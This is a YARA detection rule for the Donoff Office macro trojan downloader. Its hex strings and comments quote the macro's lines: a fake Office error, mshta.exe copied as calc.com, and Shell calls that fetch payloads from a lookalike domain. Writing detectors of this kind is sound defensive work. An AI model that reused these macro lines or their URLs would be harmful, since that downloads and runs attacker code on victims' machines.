
rule TrojanDownloader_O97M_Donoff_PDA_MTB{
	meta:
		description = "TrojanDownloader:O97M/Donoff.PDA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {4d 73 67 42 6f 78 20 22 45 72 72 6f 21 20 4f 66 66 69 63 65 20 33 36 35 20 6e 6f 20 69 6e 73 74 61 6c 6c 65 64 2e } //1 MsgBox "Erro! Office 365 no installed.
		$a_01_1 = {53 65 74 20 66 73 6f 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 63 72 69 70 74 69 6e 67 2e 46 69 6c 65 53 79 73 74 65 6d 4f 62 6a 65 63 74 22 29 } //1 Set fso = CreateObject("Scripting.FileSystemObject")
		$a_01_2 = {66 73 6f 2e 63 6f 70 79 66 69 6c 65 20 22 43 3a 5c 57 69 6e 64 6f 77 73 5c 53 79 73 74 65 6d 33 32 5c 6d 73 68 74 61 2e 65 78 65 22 2c 20 45 6e 76 69 72 6f 6e 28 22 50 55 42 4c 49 43 22 29 20 26 20 22 5c 63 61 6c 63 2e 63 6f 6d 22 2c 20 54 72 75 65 } //1 fso.copyfile "C:\Windows\System32\mshta.exe", Environ("PUBLIC") & "\calc.com", True
		$a_01_3 = {3d 20 53 68 65 6c 6c 28 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 63 61 6c 63 2e 63 6f 6d 20 22 22 68 74 74 70 73 3a 2f 2f 75 6e 69 6d 65 64 2d 63 6f 72 70 6f 72 61 74 65 64 2e 63 6f 6d 2f 62 72 61 73 69 6c 2f 43 50 41 68 74 6d 6c 2e 6d 70 33 22 22 22 29 } //1 = Shell("C:\Users\Public\calc.com ""https://unimed-corporated.com/brasil/CPAhtml.mp3""")
		$a_01_4 = {3d 20 53 68 65 6c 6c 28 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 63 61 6c 63 2e 63 6f 6d 20 22 22 68 74 74 70 73 3a 2f 2f 75 6e 69 6d 65 64 2d 63 6f 72 70 6f 72 61 74 65 64 2e 63 6f 6d 2f 62 72 61 73 69 6c 2f 43 50 41 49 6e 6a 65 63 74 54 61 72 65 66 61 2e 6d 70 33 22 22 22 29 } //1 = Shell("C:\Users\Public\calc.com ""https://unimed-corporated.com/brasil/CPAInjectTarefa.mp3""")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}